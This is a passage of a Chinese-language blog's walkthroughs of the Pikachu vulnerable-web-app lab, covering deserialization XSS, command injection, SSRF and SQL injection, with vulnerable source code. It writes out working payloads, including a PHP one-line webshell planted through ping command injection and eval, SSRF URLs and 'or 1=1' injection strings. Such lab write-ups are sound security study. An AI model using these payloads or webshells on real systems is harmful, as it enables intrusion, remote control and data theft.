+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入进去，发现下面文本有一个输出了一个 pikachu，真神奇，不知道怎么实现的？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们再输入进去，发现输出的 hello，莫非是输出最后一个变量？</p>
+<p>不管了，既然在网页中直接输出字符串，我们开始构造。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现还是输出的 pikachu，科师刚才为啥会输出 hello 呢，我们放到第二个试试？</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&#x27;pikachu&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;hello&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>OK,完美收工，应该是获取第二个的变量，从而输出在网页上。</p>
+<p><img src="/../../img/docs/pikachu/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1738632342371-4ea7e487-6a91-497a-8589-2f54ccbd12a1.png"></p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>很明显，这里代码根本就没给类 S 实例化，所以也就没用到魔法函数，只是下面的判断语句起了用途，并且不是我想的 需要第二个，还是变量名称腰围 test 就可以了，笑。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE</title>
+    <url>/posts/4689.html</url>
+    <content><![CDATA[<p><strong>RCE</strong>(remote command&#x2F;code execute)远程命令&#x2F;代码执行。</p>
+<h1 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h1><h2 id="Docker-安装-ping-命令工具"><a href="#Docker-安装-ping-命令工具" class="headerlink" title="Docker 安装 ping 命令工具"></a>Docker 安装 ping 命令工具</h2><p>由于我们 docker 中并不能执行 ping 命令，所以我们需要安装 ping 命令的工具。</p>
+<p>我们先进入 docker pikachu 的容器（注意需要 sudo）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it [容器ID] [/bin/bash]</span><br></pre></td></tr></table></figure>
+
+<p>进去之后，就用 apt 工具进行安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install iputils-ping</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/RCE/1738494111038-a345300b-250c-443d-84b8-40d91afd33ce.png"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>和 SQL&#x2F;XSS 注入一样，都可以堆输入框进行命令构造。SQL 构造的是 SQL 语句，XSS 一般构造 HTML 或者 JS，而 RCE 在这里构造 SHELL 命令。</p>
+<p>在 Linux 中，ping 命令是一直执行的，所以上面应该是</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 4 [addr]</span><br></pre></td></tr></table></figure>
+
+<p>我们的输入就是 addr，这也是我们构造的地方。如果我们想查看当前目录的文件，就构造成了</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -c 4 www.baidu.com ; ls</span><br></pre></td></tr></table></figure>
+
+<p>这里的分号是 Linux Shell 中的元字符，用于执行多条命令，几十前面的代码错了也可以执行。所以我们只需要输入 <a href="http://www.baidu.com/">www.baidu.com</a> ; ls</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738496420639-d843a8f9-2f4a-4c33-9397-c50789d0efc9.png"></p>
+<p>OK，我们就可以执行其他命令。</p>
+<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>php 的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>@：后面代码错误也不报错</li>
+<li>eval 执行括号内的命令(php 代码)</li>
+<li>$_POST 通过 POST 获取数据</li>
+</ol>
+<p>$_POST[‘123’] 用于获取 123 的</p>
+<p>构造成</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ping -c <span class="number">4</span> www.baidu.com ; <span class="keyword">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&#x27;</span><span class="number">123</span><span class="string">&#x27;]); ?&gt;&#x27;</span> &gt; <span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/RCE/1738501130163-91a1dbee-ed07-4dd4-b9ad-4fdf9f83162f.png"></p>
+<p>我们 ls 一下，多了一个 1.php，我们就可以利用这个去提权或者怎么样了。</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501161386-be20f31a-2102-4dd6-95e3-8dc6f5adda1b.png"></p>
+<p>利用菜刀或者蚁剑工具去利用</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501310483-40b1685a-e15e-4b90-a6f6-eba41ab04a52.png"></p>
+<p>目录查看</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501341495-b7591b6c-fdf1-44ff-a1fc-8e04514f375f.png"></p>
+<p>shell 命令执行</p>
+<p><img src="/../../img/docs/pikachu/RCE/1738501366014-3800f804-6e09-4fc3-b8d3-2c4a4f2c9366.png"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>用 shell_exec 来执行 ping 命令的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;ipaddress&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$ip</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ipaddress&#x27;</span>];</span><br><span class="line"><span class="comment">//     $check=explode(&#x27;.&#x27;, $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="title function_ invoke__">php_uname</span>(<span class="string">&#x27;s&#x27;</span>), <span class="string">&#x27;windows&#x27;</span>))&#123;</span><br><span class="line"><span class="comment">//         var_dump(php_uname(&#x27;s&#x27;));</span></span><br><span class="line">        <span class="variable">$result</span>.=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping &#x27;</span>.<span class="variable">$ip</span>);<span class="comment">//直接将变量拼接进来，没做处理</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span>.=<span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ping -c 4 &#x27;</span>.<span class="variable">$ip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h1><p>eval可以执行 php 的一些代码。</p>
+<p>我们先看看这题，我们输一下 php 代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/RCE/1738502272134-3624c632-f4c2-444e-a51c-05fd41d23ecc.png"></p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[\&quot;123\&quot;]); ?&gt;&#x27; &gt; 1.php&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>我们可以去 ping 那里看我们创建 1.php</p>
+<p>然后同样的去蚁剑去利用。</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>我们这一关本身就有 eval 命令，我们就可以利用这点</p>
+<p>我们看到 POST 请求，name 有 txt 和 submit，我们的 txt 相当于 123，而 submit 我们就需要在蚁剑中设置。</p>
+<p><strong>步骤</strong></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503233389-216bb44b-34f2-4f3b-b35f-b896dded859c.png"></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503299951-facc0838-0d38-425b-a0a2-daa66040dd48.png"></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503318036-66e70479-203b-41a4-babb-a44ba1a586e2.png"></p>
+<p><img src="/../../img/docs/pikachu/RCE/1738503568742-93a285d9-1c9b-41d9-a3ab-cda8438b00d4.png"></p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSRF</title>
+    <url>/posts/51037.html</url>
+    <content><![CDATA[<p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p>
+<p><strong>PHP中下面函数的使用不当会导致SSRF:</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>file_get_contents() 将整个文件读入一个字符串</li>
+<li>fsockopen() 打开 Internet 或者 Unix 套接字连接</li>
+<li>curl_exec() 执行 cURL 会话</li>
+</ol>
+<h1 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h1><p>curl 可以接收很多内容，不论是一个链接，还是一个文件路径。如果是一个链接，curl 就直接访问那个链接，如果是一个文件路径就直接访问那个文件。</p>
+<p>我们发现超链接是</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.17.129:8000/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/vul/ssrf/ssrf_info/info1.php</span></span><br></pre></td></tr></table></figure>
+
+<p>不过我们的端口是 8000 ，我们再设置一下，还是不行，我试了一下，必须是外部的 IP（不管是局域网 IP 还是公网 IP 也好，不能是本地回环地址）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.17.129:8000/vul/ssrf/ssrf_curl.php?url=http://192.168.17.129:8000/vul/ssrf/ssrf_info/info1.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/SSRF/1738635424976-ff008073-5c5c-4ed9-9ca3-f841bfe2cf52.png"></p>
+<p>所以很容易可以调用其他的 PHP 代码，是吧。</p>
+<p>我们又会用到 pikachu RCE exec”eval”的页面 php 代码了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/ssrf/ssrf_curl.php?url=http:<span class="comment">//192.168.17.129:8000/vul/rce/rce_eval.php</span></span><br></pre></td></tr></table></figure>
+
+<p>页面有点错乱，没关系。不过，测了半天发现没用。</p>
+<p><img src="/../../img/docs/pikachu/SSRF/1738635514756-3301a5ed-37c0-469b-ba23-744d08a2893c.png"></p>
+<p>不过我们可以用这个干很多事情了。</p>
+<p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$URL</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$CH</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h1><p>一样的，只不过是文件而已</p>
+<h2 id="file-文件路径"><a href="#file-文件路径" class="headerlink" title="file:&#x2F;&#x2F;文件路径"></a>file:&#x2F;&#x2F;文件路径</h2><p>这个是服务器的本地文件路径</p>
+<h2 id="http-文件路径"><a href="#http-文件路径" class="headerlink" title="http:&#x2F;&#x2F;文件路径"></a>http:&#x2F;&#x2F;文件路径</h2><p>是基于网站根目录的路径</p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL-Inject</title>
+    <url>/posts/14905.html</url>
+    <content><![CDATA[<p>SQL 注入</p>
+<p>前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 </p>
+<h1 id="MySQL-通用查库、查表、查列"><a href="#MySQL-通用查库、查表、查列" class="headerlink" title="MySQL 通用查库、查表、查列"></a>MySQL 通用查库、查表、查列</h1><p>我们直接使用 MySQL 命令行进行操作。</p>
+<h2 id="使用库"><a href="#使用库" class="headerlink" title="使用库"></a>使用库</h2><p>我们平时在进行 SQL 注入时，后端代码已经自己使用库了。但是，我们在使用 MySQL 命令行工具时，是需要通过命令来使用库的。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use pikachu</span><br></pre></td></tr></table></figure>
+
+<p>我们就可以查看当前库了</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> database();</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> database() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> pikachu    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<p>我们呢发现命令行输出了这两个数据库。原理是使用 select 读取了 information_schema 数据库中的 schemata 表中的 schema_name 列。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> schema_name        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pikachu            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h2><p>很明显，我们需要的数据在</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>看来还是有很多表的，不过我们用到的表是 users 表。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> table_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="operator">|</span> httpinfo   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">member</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> message    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> xssblind   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>发现有 id, username, password, level 这四列。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> column_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> id          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> username    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> password    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> level       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>有了这些名称之后我们就可以查看数据了（也叫做字段）。</p>
+<h2 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h2><p>比如我们呢最长用到的账号和密码(username 和 password)</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username, password <span class="keyword">from</span> pikachu.users;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现有这三个账户的密码，而且这些密码是经过 MD5 加密之后的，并且这些 MD5 默认长度为 32 字符。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> e10adc3949ba59abbe56e057f20f883e <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pikachu  <span class="operator">|</span> <span class="number">670</span>b14728ad9902aecba32e22fa4f6bd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> test     <span class="operator">|</span> e99a18c428cb38d5f260853678922e03 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+----------------------------------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<h1 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h1><p>使用 HackBar，先随便在点几下选项，然后去 Load，在 id&#x3D;1 后面加上 or 1&#x3D;1</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> &amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>全部都输出出来了。</p>
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1738292019647-19506047-32fa-4381-ad83-442b300794f6.png"></p>
+<p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select username,email from member where id=<span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里明显没有做啥过滤，可直接利用注入。</p>
+<h1 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h1><p>我们输入一个 vince，得到一个 url</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//192.168.17.129:8000/vul/sqli/sqli_str.php?name=vince&amp;submit=%E6%9F%A5%E8%AF%A2#</span></span><br></pre></td></tr></table></figure>
+
+<p>先在 vince 后面加一个 or 1&#x3D;1 看看。</p>
+<p><img src="/../../img/docs/pikachu/SQL-Inject/1738292234637-3d9b5385-24d6-465f-92af-b011775de29e.png"></p>
+<p>发现没用。看看是被单引号还是被双引号单独括起来了。</p>
+<p>双引号时被当作普通字符，单引号是就报错了。所以单引号就能绕过。</p>
+<p>构造</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">?name=vince<span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>&amp;submit=%E6%<span class="number">9</span>F%A5%E8%AF%A2#</span><br></pre></td></tr></table></figure>
+
+<p><strong>源码分析</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，单独用单引号括起来了，在 SQL 语句中是字符串的意思，就直接将$name 整个当作字符串。又因为$query 是字符串，后面有没有过滤，我们自然而然直接用单引号进行绕过。</p>
+<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>这里也是 GET 请求，也是单引号会报错。用上面的构造方法，发现搜索又正常了。因为是搜索，并且刚才的报错有一个%（SQL 语句文本匹配，可以匹配零个或多个字符）</p>
+<p>我们刚才输入的是 v’所以为 like ‘%v%’’</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; ... username like &#x27;%<span class="subst">$name</span>%&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以尝试一下构造成，就可以匹配任何字符</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot; ... username like &#x27;%&#x27; or &#x27;<span class="subst">$name</span>%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>就为这个</p>
